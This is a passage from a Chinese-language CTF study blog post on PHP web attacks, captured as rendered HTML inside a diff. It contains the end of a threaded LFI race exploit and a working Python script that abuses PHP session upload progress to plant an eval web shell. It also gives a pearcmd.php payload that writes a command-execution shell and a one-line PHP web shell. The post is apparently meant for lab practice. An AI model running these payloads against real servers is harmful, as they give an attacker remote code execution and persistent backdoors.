+</span></span><span class="line"><span class="cl">        sys.exit(1)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    print &#34;Getting initial offset...&#34;,  
+</span></span><span class="line"><span class="cl">    reqphp, tag, reqlfi = setup(host, port)
+</span></span><span class="line"><span class="cl">    offset = getOffset(host, port, reqphp)
+</span></span><span class="line"><span class="cl">    sys.stdout.flush()
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    maxattempts = 1000
+</span></span><span class="line"><span class="cl">    e = threading.Event()
+</span></span><span class="line"><span class="cl">    l = threading.Lock()
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    print &#34;Spawning worker pool (%d)...&#34; % poolsz
+</span></span><span class="line"><span class="cl">    sys.stdout.flush()
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    tp = []
+</span></span><span class="line"><span class="cl">    for i in range(0,poolsz):
+</span></span><span class="line"><span class="cl">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    for t in tp:
+</span></span><span class="line"><span class="cl">        t.start()
+</span></span><span class="line"><span class="cl">    try:
+</span></span><span class="line"><span class="cl">        while not e.wait(1):
+</span></span><span class="line"><span class="cl">            if e.is_set():
+</span></span><span class="line"><span class="cl">                break
+</span></span><span class="line"><span class="cl">            with l:
+</span></span><span class="line"><span class="cl">                sys.stdout.write( &#34;\r% 4d / % 4d&#34; % (counter, maxattempts))
+</span></span><span class="line"><span class="cl">                sys.stdout.flush()
+</span></span><span class="line"><span class="cl">                if counter &gt;= maxattempts:
+</span></span><span class="line"><span class="cl">                    break
+</span></span><span class="line"><span class="cl">        print
+</span></span><span class="line"><span class="cl">        if e.is_set():
+</span></span><span class="line"><span class="cl">            print &#34;Woot!  \m/&#34;
+</span></span><span class="line"><span class="cl">        else:
+</span></span><span class="line"><span class="cl">            print &#34;:(&#34;
+</span></span><span class="line"><span class="cl">    except KeyboardInterrupt:
+</span></span><span class="line"><span class="cl">        print &#34;\nTelling threads to shutdown...&#34;
+</span></span><span class="line"><span class="cl">        e.set()
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    print &#34;Shuttin&#39; down...&#34;
+</span></span><span class="line"><span class="cl">    for t in tp:
+</span></span><span class="line"><span class="cl">        t.join()
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">if __name__==&#34;__main__&#34;:
+</span></span><span class="line"><span class="cl">    main()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="session文件包含upload_progress文件上传" class="headerLink">
+    <a href="#session%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%abupload_progress%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" class="header-mark"></a>0.8 session文件包含（upload_progress文件上传）</h3><p>有包含点，且<code>PHP_SESSION_UPLOAD_PROGRESS</code>不变时，可以使用此脚本</p>
+<p><code>session_upload_progress</code>最初是php为上传进度条设计的一个功能，在上传文件较大的情况下，PHP将进行流式上传，并将进度信息放在session中，此时即使用户没有初始化session，php也会自动初始化session。而且，默认情况下<code>session.uoload_progress.enabled</code>是为<code>on</code>的，也就是说这个特性默认开启。所以，我们可以通过这个特性来在目标主机上初始化session。</p>
+<p>从上面可以看到，session中一部分数据<code>（session.uoload_progress.enabled）</code>是用户自己控制的。那么我们只要在文件上传的时候，同时post一个恶意字段<code>PHP_SESSION_UPLOAD_PROGRESS</code>，目标服务器的PHP就会自动启用session，session文件将会自动创建。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">requests</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">threading</span>
+</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">sess</span><span class="o">=</span><span class="s1">&#39;ctfshow&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://6eb9a422-f96b-4a44-a67d-0d9f9d3e716f.challenges.ctfer.com:8080/&#34;</span> <span class="c1">#靶场地址</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">data1</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</span><span class="p">:</span><span class="s1">&#39;&lt;?php echo &#34;success&#34;;file_put_contents(&#34;/var/www/html/1.php&#34;,&#34;&lt;?php eval(</span><span class="se">\\</span><span class="s1">$_POST[1]);?&gt;&#34;);?&gt;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">file</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;file&#39;</span><span class="p">:</span><span class="s1">&#39;ctfshow&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">cookies</span><span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span> <span class="n">sess</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data1</span><span class="p">,</span><span class="n">files</span><span class="o">=</span><span class="n">file</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s2">&#34;?file=../../../../../../../tmp/sess_ctfshow&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="s1">&#39;success&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;shell 地址为：&#34;</span><span class="o">+</span><span class="n">url</span><span class="o">+</span><span class="s2">&#34;1.php&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                        
+</span></span><span class="line"><span class="cl"><span class="n">threads</span> <span class="o">=</span> <span class="p">[</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">write</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">       <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">read</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="pear文件包含" class="headerLink">
+    <a href="#pear%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab" class="header-mark"></a>0.9 pear文件包含</h3><p>pear模块下有很多php文件，可以利用其中的某个php，分析发现<code>/usr/local/lib/php/PEAR/Command/Install.php</code>存在可利用点</p>
+<p><code>/usr/local/lib/php/pearcmd.php</code>存在可利用点</p>
+<p><figure><a class="lightgallery" href="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209092146690.png" title="image-20220909214644657" data-thumbnail="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209092146690.png">
+        <img
+            
+            loading="lazy"
+            src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209092146690.png"
+            srcset="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209092146690.png, https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209092146690.png 1.5x, https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209092146690.png 2x"
+            sizes="auto"
+            alt="image-20220909214644657">
+    </a></figure></p>
+<p>argv注册功能开启了就可以使用这种姿势</p>
+<p>可以通过配置文件写入一句话木马</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">?</span><span class="n">file</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">php</span><span class="o">/</span><span class="n">pearcmd</span><span class="o">.</span><span class="n">php</span><span class="o">&amp;</span><span class="n">aaaa</span><span class="o">+</span><span class="n">config</span><span class="o">-</span><span class="n">create</span><span class="o">+/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/&lt;</span><span class="err">?</span><span class="o">=</span><span class="err">`</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="err">`</span><span class="p">;</span><span class="err">?</span><span class="o">&gt;+</span><span class="mf">1.</span><span class="n">php</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中aaa可以将数据弹出argv，三个➕，四个元素</p>
+<h3 id="远程文件包含" class="headerLink">
+    <a href="#%e8%bf%9c%e7%a8%8b%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab" class="header-mark"></a>0.10 远程文件包含</h3><p>这里是结合了上边的日志包含，或者可以理解成远程日志包含</p>
+<p>这里由于题目过滤了符号. 所以我们可以用http://www.ab173.com/net/ip2int.php 将IP转换成纯数字</p>
+<p><figure><a class="lightgallery" href="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209092204124.png" title="image-20220909220415037" data-thumbnail="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209092204124.png">
+        <img
+            
+            loading="lazy"
+            src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209092204124.png"
+            srcset="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209092204124.png, https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209092204124.png 1.5x, https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209092204124.png 2x"
+            sizes="auto"
+            alt="image-20220909220415037">
+    </a></figure></p>
+<h1 id="四文件上传" class="headerLink">
+    <a href="#%e5%9b%9b%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" class="header-mark"></a>四.文件上传</h1><h3 id="0x1-何为文件上传" class="headerLink">
+    <a href="#0x1-%e4%bd%95%e4%b8%ba%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" class="header-mark"></a>0.11 0x1 何为文件上传：</h3><ul>
+<li>文件上传就是通过流的方式将文件写到服务器上</li>
+<li>文件上传必须以POST提交表单</li>
+<li>表单中需要 <code>&lt;input type=&quot;file&quot; name=&quot;upload&quot;&gt;</code></li>
+</ul>
+<p>一句话木马(具体内容写在<a href="https://scofield.top/web/%E6%8A%80%E8%83%BD%E5%82%A8%E5%A4%87/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" target="_blank" rel="noopener noreferrer">这篇文章</a>)：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php eval($_POST[&#39;a&#39;]) ?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中eval就是执行命令的函数，**$_POST[‘a’]**就是接收的数据。eval函数把接收的数据当作PHP代码来执行。这样我们就能够让插入了一句话木马的网站执行我们传递过去的任意PHP语句。</p>
+<h3 id="0x2-文件上传漏洞类型" class="headerLink">
+    <a href="#0x2-%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e%e7%b1%bb%e5%9e%8b" class="header-mark"></a>0.12 0x2 文件上传漏洞类型</h3><img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221108164430450.png" alt="image-20221108164430450" style="zoom: 67%;" />
+<h3 id="0x3-实例" class="headerLink">
+    <a href="#0x3-%e5%ae%9e%e4%be%8b" class="header-mark"></a>0.13 0x3 实例</h3><p>去bugku、ctfhub刷题就好了，这里就不赘述了</p>
+</div>
+
+        
+
+
+<h2>Related Content</h2>
+<div class="related-container">
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/buuctf_reinforce_wp/">BUUCTF awdp加固题</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/ctfhub--info_leakage/">ctfhub_信息泄露wp</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/ctfshow_deserialize/">ctfshow_deserialize</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/ctfshow_file_include/">ctfshow_file_include</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/ctfshow_file_upload/">ctfshow_file_upload</a>
+            </h2>
+        </div>
+    
+
+</div>
+
+<div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 0001-01-01</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/php/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
+                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\PHP.md target="_blank" rel="noopener noreferrer">View source</a>
+                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\PHP.md target="_blank" rel="noopener noreferrer">Edit this page</a>
+                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20PHP&body=|Field|Value|%0A|-|-|%0A|Title|PHP|%0A|Url|http://scofield1920.github.io/php/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\PHP.md| target="_blank" rel="noopener noreferrer">Report issue</a>
+                    </span></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/php/" data-title="PHP" data-hashtags="foundation,CTF,web"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/php/" data-hashtag="foundation"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/php/" data-title="PHP"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/php/" data-title="PHP"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/php/" data-title="PHP"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/php/" data-title="PHP" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;PHP&#34;, &#34;http://scofield1920.github.io/php/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/foundation/">foundation</a>,&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/web/">web</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/pikachu_range_summary/" class="prev" rel="prev" title="Pikachu靶场汇总"><i class="fas fa-angle-left fa-fw"></i>Pikachu靶场汇总</a>
+            <a href="/nssctf-web-wp/" class="next" rel="next" title="NSSCTF-web-wp">NSSCTF-web-wp<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.120.4">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Scfie1d-Blog","mobile-header-typeit":"Scfie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
